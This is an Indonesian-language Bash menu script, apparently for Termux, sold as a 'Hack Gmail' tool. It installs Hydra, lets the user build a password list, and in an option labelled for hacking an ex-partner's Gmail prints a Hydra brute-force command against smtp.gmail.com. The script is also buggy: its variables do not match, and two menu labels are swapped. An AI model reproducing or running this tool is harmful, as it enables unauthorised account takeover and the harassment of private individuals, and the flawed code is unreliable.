#!/bin/bash

#Tes Kekuatan Nyata Brute
echo
clear
function main_menu() {
    while :
    do     
echo -e "\e[1;32m======PASSWORD CRACKING======\e[0m"
echo
echo "    ─▄▀▀▀▄──────────────"
echo "    ─█ ND─█──────────────"
echo "    ███████─────────▄▀▀▄"
echo "    ██───██░░█▀█▀▀▀▀█░░█"
echo "    ███▄███░░▀░▀░░░░░▀▀░"
echo
        echo " +--------------------------+"
        echo " |                          |"
        echo " |      HACK GMAIL ND       |"
        echo " |                          |"
        echo " +--------------------------+"
        echo
        echo -e "\e[1;36m STRATEGI NYATA - DOMINAN\e[0m"
echo
#DAFTAR OPSI
        echo -e "\e[1;33m[01]\e[1;32m Instal hack gmail\e[0m"
echo
        echo -e "\e[1;33m[02]\e[1;32m Informasi pengguna\e[0m"
echo
        echo -e "\e[1;33m[03]\e[1;32m Tools Lainya\e[0m"
echo
        echo -e "\e[1;33m[04]\e[1;32m Hargai karya ND\e[0m"
echo
        echo -e "\e[1;33m[05]\e[1;32m Lihat daftar kata sandi(.txt)\e[0m"
echo
        echo -e "\e[1;33m[06]\e[1;32m Buat pass.txt sendiri\e[0m"
echo
       echo -e "\e[1;33m[07]\e[1;32m Retas gmail Mantan\e[0m"
echo
       echo -e "\e[1;33m[08]\e[1;32m Keluar dari Menu \e[0m"
echo
        read -p "Pilih No>: " m_choice
        echo
# MENU PILIHAN
        case "$m_choice" in
            1) figlet Install
                 figlet Tools
                pkg install hydra
              echo -e "\e[1;32m===============================================\e[0m"
                figlet Hack Gmail
             echo -e "\e[1;32m================================================\e[0m"
             echo -e "\e[1;31m LAGI MENGINSTAL CUK\e[0m"
echo
             sleep 4
clear
                echo
                ;;
            2) figlet  MASUK TXT
                echo
sleep 2                
                 cat README.md
sleep 7
                echo 
clear
                ;;
            3)  sub_menu
                ;;
            4)  figlet CREDIT 
echo
                 echo -e "\e[1;32mCREATED BY: Strategi Nyata and Hydra\e[0m"
echo
                echo -e "\e[1;32mFACEBOOK MY: Nuzul Dzikri\e[0m"
echo
                echo -e "\e[1;32mYOUTUBE MY: Di Banned(ND)\e[0m"
echo
                echo -e "\e[1;32mPESAN: Recode boleh Asal tau diri\e[0m"
                echo
sleep 4
clear
                ;;
            5)  echo -e "\e[1;32mBUAT PASS.TXT\e[0m"
echo
                  sleep 3
                  echo -e "\e[1;33mUNTUK KELUAR TEKAN CTRL+ D\e[0m"
                  echo
                   echo -e "\e[1;36mPASSWORD TULISAN : \e[0m"
                  sleep 2
                  cat >pass.txt
                ;;
            6)  figlet LIHAT 
                  figlet PASSWORD
sleep 3
echo
                 echo -e "\e[1;36mPASSWORD DIKUMPULKAN DARI HUTAN:\e[0m"
                 cat pass.txt
sleep 7
                 echo
                ;;
             7) echo
#Mengeksekusi data

echo -e "\e[1;33mTULIS EMAIL SAMPEAN: \e[0m"
read MAIL
echo
echo -e "\e[1;33mTULIS EMAIL MANTAN: \e[0m"
read PASSWORD
echo
echo
#Copy and Paste

echo -e "\e[1;36m              COPAS PERINTAH BERIKUT\e[0m"
echo -e "\e[1;36m      UNTUK MELAKSANAKAN PENCARIAN PASSWORD\e[0m"
echo
sleep 3
echo " #####################################"
echo " #          PERINTAH HYDRA            #"
echo " #####################################"
echo
echo
sleep 1
echo -e "\e[1;32m hydra -l $CORREO -P $PASSLIST -s 465 -S -v -V -t 10 smtp.gmail.com smtp\e[0m"
echo 
echo
echo
exit 0
              ;;
             8) exit 0
# MENU TERAKIR ND
             ;;
            *)  echo -e "\e[1;31mIni Bukan Opsi yg Bener\e[0m"
sleep 2
                echo
                ;;
        esac
    done
}

function sub_menu()
{
    while :
    do
        echo
        figlet NUZUL 
        figlet TOOLS
        echo
        echo -e "\e[1;33m[01]\e[1;32m install Htop\e[0m"
echo
        echo -e "\e[1;33m[02]\e[1;32m install Nmap\e[0m"
echo
        echo -e "\e[1;33m[03]\e[1;32m Kembali ke Menu Sebelume\e[0m"
echo
        read -p "Choice: " s_choice
        echo
#MENU ALAT
        case "$s_choice" in
            1)  figlet install
                figlet HTOP
sleep 2
                echo
                 pkg install htop
                echo "==============================================="
                figlet HTOP
             echo "================================================"
                 echo -e "\e[1;31mALAT DI INSTAL\e[0m"
sleep 3
echo
clear
                ;;
            2)  figlet INSTAL
                 figlet NMAP
sleep 2
                echo
                pkg install nmap 
                echo "==============================================="
                figlet NMAP
             echo "================================================"
                 echo -e "\e[1;31mALAT DI INSTAL\e[0m"
echo
clear
                ;;
            3)  main_menu
                ;;
            *)  echo -e "\e[1;31mIni opsi yg gak Bener\e[0m"
sleep 2
                echo
                ;;
        esac
    done
}

main_menu

exit 0
